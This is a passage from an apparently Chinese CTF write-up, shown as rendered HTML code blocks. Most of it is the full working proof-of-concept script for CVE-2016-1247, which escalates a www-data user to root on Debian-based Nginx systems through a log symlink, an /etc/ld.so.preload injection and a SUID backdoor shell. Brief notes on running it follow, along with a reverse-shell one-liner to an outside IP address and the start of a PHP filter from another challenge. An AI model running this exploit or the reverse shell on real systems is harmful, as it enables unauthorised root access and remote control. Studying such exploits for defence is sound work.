</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit</span>
</span></span><span class=line><span class=cl><span class=c1># nginxed-root.sh (ver. 1.0)</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># CVE-2016-1247</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Discovered and coded by:</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Dawid Golunski</span>
</span></span><span class=line><span class=cl><span class=c1># dawid[at]legalhackers.com</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># https://legalhackers.com</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># ---</span>
</span></span><span class=line><span class=cl><span class=c1># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu</span>
</span></span><span class=line><span class=cl><span class=c1># etc.) to escalate their privileges from nginx web server user (www-data) to root </span>
</span></span><span class=line><span class=cl><span class=c1># through unsafe error log handling.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># The exploit waits for Nginx server to be restarted or receive a USR1 signal.</span>
</span></span><span class=line><span class=cl><span class=c1># On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)</span>
</span></span><span class=line><span class=cl><span class=c1># script which is called daily by the cron.daily on default installations.</span>
</span></span><span class=line><span class=cl><span class=c1># The restart should take place at 6:25am which is when cron.daily executes.</span>
</span></span><span class=line><span class=cl><span class=c1># Attackers can therefore get a root shell automatically in 24h at most without any admin</span>
</span></span><span class=line><span class=cl><span class=c1># interaction just by letting the exploit run till 6:25am assuming that daily logrotation </span>
</span></span><span class=line><span class=cl><span class=c1># has been configured. </span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit usage:</span>
</span></span><span class=line><span class=cl><span class=c1># ./nginxed-root.sh path_to_nginx_error.log </span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># To trigger logrotation for testing the exploit, you can run the following command:</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># See the full advisory for details at:</span>
</span></span><span class=line><span class=cl><span class=c1># https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Video PoC:</span>
</span></span><span class=line><span class=cl><span class=c1># https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Disclaimer:</span>
</span></span><span class=line><span class=cl><span class=c1># For testing purposes only. Do no harm.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>BACKDOORSH</span><span class=o>=</span><span class=s2>&#34;/bin/bash&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>BACKDOORPATH</span><span class=o>=</span><span class=s2>&#34;/tmp/nginxrootsh&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>PRIVESCLIB</span><span class=o>=</span><span class=s2>&#34;/tmp/privesclib.so&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>PRIVESCSRC</span><span class=o>=</span><span class=s2>&#34;/tmp/privesclib.c&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>SUIDBIN</span><span class=o>=</span><span class=s2>&#34;/usr/bin/sudo&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> cleanexit <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=c1># Cleanup </span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Cleaning up...&#34;</span>
</span></span><span class=line><span class=cl>    rm -f <span class=nv>$PRIVESCSRC</span>
</span></span><span class=line><span class=cl>    rm -f <span class=nv>$PRIVESCLIB</span>
</span></span><span class=line><span class=cl>    rm -f <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl>    touch <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -f /etc/ld.so.preload <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> -n &gt; /etc/ld.so.preload
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Job done. Exiting with code </span><span class=nv>$1</span><span class=s2> \n&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=nv>$1</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> ctrl_c<span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Ctrl+C pressed&#34;</span>
</span></span><span class=line><span class=cl>    cleanexit <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#intro </span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt;_eascii_
</span></span></span><span class=line><span class=cl><span class=s> _______________________________
</span></span></span><span class=line><span class=cl><span class=s>&lt; Is your server (N)jinxed ? ;o &gt;
</span></span></span><span class=line><span class=cl><span class=s> -------------------------------
</span></span></span><span class=line><span class=cl><span class=s>           \ 
</span></span></span><span class=line><span class=cl><span class=s>            \          __---__
</span></span></span><span class=line><span class=cl><span class=s>                    _-       /--______
</span></span></span><span class=line><span class=cl><span class=s>               __--( /     \ )XXXXXXXXXXX\v.  
</span></span></span><span class=line><span class=cl><span class=s>             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
</span></span></span><span class=line><span class=cl><span class=s>            /XXX(       U     )        XXXXXXX\ 
</span></span></span><span class=line><span class=cl><span class=s>          /XXXXX(              )--_  XXXXXXXXXXX\ 
</span></span></span><span class=line><span class=cl><span class=s>         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
</span></span></span><span class=line><span class=cl><span class=s>         XXXXX/   /            XXXXXX   \__ \XXXXX
</span></span></span><span class=line><span class=cl><span class=s>         XXXXXX__/          XXXXXX         \__----&gt;
</span></span></span><span class=line><span class=cl><span class=s> ---___  XXX__/          XXXXXX      \__         /
</span></span></span><span class=line><span class=cl><span class=s>   \-  --__/   ___/\  XXXXXX            /  ___--/=
</span></span></span><span class=line><span class=cl><span class=s>    \-\    ___/    XXXXXX              &#39;--- XXXXXX
</span></span></span><span class=line><span class=cl><span class=s>       \-\/XXX\ XXXXXX                      /XXXXX
</span></span></span><span class=line><span class=cl><span class=s>         \XXXXXXXXX   \                    /XXXXX/
</span></span></span><span class=line><span class=cl><span class=s>          \XXXXXX      &gt;                 _/XXXXX/
</span></span></span><span class=line><span class=cl><span class=s>            \XXXXX--__/              __-- XXXX/
</span></span></span><span class=line><span class=cl><span class=s>             -XXXXXXXX---------------  XXXXXX-
</span></span></span><span class=line><span class=cl><span class=s>                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
</span></span></span><span class=line><span class=cl><span class=s>                  &#34;&#34;VXXXXXXXXXXXXXXXXXXV&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s>_eascii_</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Args</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$#</span> -lt <span class=m>1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] Exploit usage: \n\n</span><span class=nv>$0</span><span class=s2> path_to_error.log \n&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;It seems that this server uses: `ps aux | grep nginx | awk -F&#39;log-error=&#39; &#39;{ print </span><span class=nv>$2</span><span class=s2> }&#39; | cut -d&#39; &#39; -f1 | grep &#39;/&#39;`\n&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Priv check</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Starting the exploit as: \n\033[94m`id`\033[0m&#34;</span>
</span></span><span class=line><span class=cl>id <span class=p>|</span> grep -q www-data
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] You need to execute the exploit as www-data user! Exiting.\n&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set target paths</span>
</span></span><span class=line><span class=cl><span class=nv>ERRORLOG</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> ! -f <span class=nv>$ERRORLOG</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] The specified Nginx error log (</span><span class=nv>$ERRORLOG</span><span class=s2>) doesn&#39;t exist. Try again.\n&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [ Exploitation ]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>trap</span> ctrl_c INT
</span></span><span class=line><span class=cl><span class=c1># Compile privesc preload library</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Compiling the privesc shared library (</span><span class=nv>$PRIVESCSRC</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt;_solibeof_&gt;$PRIVESCSRC
</span></span></span><span class=line><span class=cl><span class=s>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=s>#include &lt;stdio.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>#include &lt;sys/stat.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>#include &lt;unistd.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>#include &lt;dlfcn.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>       #include &lt;sys/types.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>       #include &lt;sys/stat.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>       #include &lt;fcntl.h&gt;
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s>uid_t geteuid(void) {
</span></span></span><span class=line><span class=cl><span class=s>    static uid_t  (*old_geteuid)();
</span></span></span><span class=line><span class=cl><span class=s>    old_geteuid = dlsym(RTLD_NEXT, &#34;geteuid&#34;);
</span></span></span><span class=line><span class=cl><span class=s>    if ( old_geteuid() == 0 ) {
</span></span></span><span class=line><span class=cl><span class=s>        chown(&#34;$BACKDOORPATH&#34;, 0, 0);
</span></span></span><span class=line><span class=cl><span class=s>        chmod(&#34;$BACKDOORPATH&#34;, 04777);
</span></span></span><span class=line><span class=cl><span class=s>        unlink(&#34;/etc/ld.so.preload&#34;);
</span></span></span><span class=line><span class=cl><span class=s>    }
</span></span></span><span class=line><span class=cl><span class=s>    return old_geteuid();
</span></span></span><span class=line><span class=cl><span class=s>}
</span></span></span><span class=line><span class=cl><span class=s>_solibeof_</span>
</span></span><span class=line><span class=cl>/bin/bash -c <span class=s2>&#34;gcc -Wall -fPIC -shared -o </span><span class=nv>$PRIVESCLIB</span><span class=s2> </span><span class=nv>$PRIVESCSRC</span><span class=s2> -ldl&#34;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] Failed to compile the privesc lib </span><span class=nv>$PRIVESCSRC</span><span class=s2>.&#34;</span>
</span></span><span class=line><span class=cl>    cleanexit 2<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Prepare backdoor shell</span>
</span></span><span class=line><span class=cl>cp <span class=nv>$BACKDOORSH</span> <span class=nv>$BACKDOORPATH</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Backdoor/low-priv shell installed at: \n`ls -l </span><span class=nv>$BACKDOORPATH</span><span class=s2>`&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Safety check</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f /etc/ld.so.preload <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Symlink the log file</span>
</span></span><span class=line><span class=cl>rm -f <span class=nv>$ERRORLOG</span> <span class=o>&amp;&amp;</span> ln -s /etc/ld.so.preload <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] Couldn&#39;t remove the </span><span class=nv>$ERRORLOG</span><span class=s2> file or create a symlink.&#34;</span>
</span></span><span class=line><span class=cl>    cleanexit <span class=m>3</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l </span><span class=nv>$ERRORLOG</span><span class=s2>`&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered</span>
</span></span><span class=line><span class=cl>curl http://localhost/ &gt;/dev/null 2&gt;/dev/null
</span></span><span class=line><span class=cl><span class=c1># Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily </span>
</span></span><span class=line><span class=cl><span class=c1># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -ne <span class=s2>&#34;\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...&#34;</span>
</span></span><span class=line><span class=cl><span class=k>while</span> :<span class=p>;</span> <span class=k>do</span> 
</span></span><span class=line><span class=cl>    sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -f /etc/ld.so.preload <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=nv>$PRIVESCLIB</span> &gt; /etc/ld.so.preload
</span></span><span class=line><span class=cl>        rm -f <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl>        break<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># /etc/ld.so.preload should be owned by www-data user at this point</span>
</span></span><span class=line><span class=cl><span class=c1># Inject the privesc.so shared library to escalate privileges</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=nv>$PRIVESCLIB</span> &gt; /etc/ld.so.preload
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Adding </span><span class=nv>$PRIVESCLIB</span><span class=s2> shared lib to /etc/ld.so.preload&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&#34;</span>
</span></span><span class=line><span class=cl>chmod <span class=m>755</span> /etc/ld.so.preload
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Escalating privileges via the </span><span class=nv>$SUIDBIN</span><span class=s2> SUID binary to get root!&#34;</span>
</span></span><span class=line><span class=cl>sudo 2&gt;/dev/null &gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check for the rootshell</span>
</span></span><span class=line><span class=cl>ls -l <span class=nv>$BACKDOORPATH</span>
</span></span><span class=line><span class=cl>ls -l <span class=nv>$BACKDOORPATH</span> <span class=p>|</span> grep rws <span class=p>|</span> grep -q root
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -eq <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span> 
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l </span><span class=nv>$BACKDOORPATH</span><span class=s2>`&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m&#34;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\n[!] Failed to get root&#34;</span>
</span></span><span class=line><span class=cl>    cleanexit <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rm -f <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> &gt; <span class=nv>$ERRORLOG</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Use the rootshell to perform cleanup that requires root privilges</span>
</span></span><span class=line><span class=cl><span class=nv>$BACKDOORPATH</span> -p -c <span class=s2>&#34;rm -f /etc/ld.so.preload; rm -f </span><span class=nv>$PRIVESCLIB</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Reset the logging to error.log</span>
</span></span><span class=line><span class=cl><span class=nv>$BACKDOORPATH</span> -p -c <span class=s2>&#34;kill -USR1 `pidof -s nginx`&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Execute the rootshell</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\n[+] Spawning the rootshell </span><span class=nv>$BACKDOORPATH</span><span class=s2> now! \n&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$BACKDOORPATH</span> -p -i
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Job done.</span>
</span></span><span class=line><span class=cl>cleanexit <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>有个细节，就是必须要在Linux里面创建sh文件，不然会报错，然后运行poc即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>chmod</span> <span class=o>+</span><span class=n>x</span> <span class=n>nginx</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=n>nginx</span><span class=o>.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=n>nginx</span><span class=o>.</span><span class=n>sh</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>nginx</span><span class=o>/</span><span class=n>error</span><span class=o>.</span><span class=n>log</span>
</span></span></code></pre></td></tr></table></div></div><p>没有成功，反弹shell再来执行看看会不会变化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bash -i &gt;&amp; /dev/tcp/156.238.233.93/9999 0&gt;&amp;1
</span></span></code></pre></td></tr></table></div></div><p>等一分钟漏洞重新触发就是root权限了</p><h2 id=签到>签到</h2><p><code>www.zip</code>拿到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>check</span><span class=p>(</span><span class=nv>$arr</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/load|and|or|\||\&amp;|select|union|\&#39;|=| |</span><span class=se>\\</span><span class=s2>\|,|sleep|ascii/i&#34;</span><span class=p>,</span><span class=nv>$arr</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=s2>&#34;&lt;script&gt;alert(&#39;bad hacker!&#39;)&lt;/script&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>           <span class=k>die</span><span class=p>();</span>   
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
